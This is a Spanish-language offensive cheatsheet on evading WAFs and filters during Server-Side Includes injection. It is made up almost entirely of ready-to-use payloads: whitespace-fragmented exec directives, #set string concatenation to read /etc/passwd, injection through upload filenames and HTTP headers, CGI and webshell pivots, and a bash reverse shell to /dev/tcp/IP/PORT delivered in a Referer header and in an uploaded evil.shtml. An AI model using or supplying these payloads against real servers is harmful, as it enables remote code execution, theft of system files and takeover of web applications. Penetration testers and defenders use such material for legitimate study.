---
aliases:
  - SSI filter bypass
  - SSI WAF bypass
tags:
  - type/cheatsheet
  - vuln/ssi
  - technique/defense-evasion
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Evasión de Filtros

***

## Cheatsheet

| **Filtro** | **Bypass** | **Notas** |
|:---:|:---:|---|
| Bloquea `<!--#exec` | `<!--#  exec cmd="id"-->` | Espacios extra entre `#` y directiva. |
| Bloquea `exec` keyword | `<!--#include virtual="/cgi-bin/p.cgi?$(id)" -->` | Chain via CGI con command injection. |
| Bloquea `cmd=` | `<!--#exec cmd='id'-->` | Comillas simples en vez de dobles. |
| Bloquea `"` (comillas dobles) | `<!--#exec cmd=id-->` | Sin comillas (algunos parsers aceptan). |
| Quita `<!--` literales | Inyectar en file upload `filename`: `<!--#exec cmd="id"-->.shtml` | El filename se renderiza sin filtrar al listar directorios. |
| Bloquea `/etc/passwd` | `<!--#set var="p" value="/etc/pa"--><!--#include file="$p"sswd" -->` | Concatenación de strings via `#set`. |
| Bloquea `#exec` | `<!--#include virtual="shell.shtml" -->` → dentro sube otro file con exec | Chain indirecta. |
| HTML-encode filter | `&lt;!--#exec cmd="id"--&gt;` | Raro — solo si app decode antes de parse SSI. |
| URL-encode filter | `%3C%21--%23exec%20cmd%3D%22id%22--%3E` | Solo en contextos donde URL decode pasa a SSI parser. |
| Upload SVG con SSI | `<svg><!--#exec cmd="id"--></svg>` + rename a `.shtml` | Si upload permite SVG pero ext rename es posible. |
^ssi-bypass

___

## Overview

Los WAFs y filtros regex buscan patterns como `<!--#exec` o `<!--#include`. Bypass típico: **fragmentar la directiva** con whitespace, concatenar strings con `#set`, o pivotear via directivas menos comunes.

### Fragmentación de directiva

SSI parser tolera whitespace variable entre `<!--#` y el nombre de directiva:
```
<!--#exec cmd="id"-->             ← clásico
<!-- #exec cmd="id" -->            ← espacio post <!--
<!--#   exec cmd="id"-->           ← múltiples espacios
<!--  #  exec  cmd = "id"  -->     ← todo separado
<!--#exec cmd = "id" -->           ← espacio alrededor del =
```

### Concat de strings con `#set`

Romper blacklist keywords:
```html
<!--#set var="a" value="ex"-->
<!--#set var="b" value="ec"-->
<!--#set var="action" value="$a$b"-->
<!--#$action cmd="id" -->             <!-- depende del parser -->
```

Más confiable: split en `file=` / `cmd=`:
```html
<!--#set var="p1" value="/etc/"-->
<!--#set var="p2" value="passwd"-->
<!--#include file="$p1$p2" -->
```

### Inyección vía filename

Si la app muestra nombres de archivos subidos (listado de uploads, preview, etc):
```
Upload filename: shell.shtml
Content: <!--#exec cmd="id" -->
```
O sin subir:
```
Upload filename: <!--#exec cmd="id" -->.txt
```
→ El server renderiza el nombre literal si el listado es `.shtml`.

### Inyección vía headers HTTP

Si headers se reflejan en .shtml:
```
User-Agent: <!--#exec cmd="id" -->
Referer: <!--#exec cmd="bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" -->
```

### Alternativa: pasar de SSI a CGI

Si SSI tiene `#exec` bloqueado pero `#include virtual` activo → incluir CGI que acepte commandos:
```html
<!--#include virtual="/cgi-bin/vulnerable.cgi?cmd=id" -->
```

### Bypass de `+IncludesNOEXEC`

Apache flag que permite SSI pero **no** `#exec`. Fallback:
1. Usar [[SSI - Inclusión de Archivos]] `#include virtual` para leer archivos.
2. Si CGI está disponible → chain via CGI.
3. Si PHP coexiste + upload writable → subir webshell → `#include virtual="/uploads/shell.php"` → RCE.

### Chain con file upload

Vector clásico: subir `.shtml` con payload, si extension check solo filtra `.php`:
```
POST /upload HTTP/1.1
filename="evil.shtml"

<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" -->
```
Luego `GET /uploads/evil.shtml` → RCE.

***
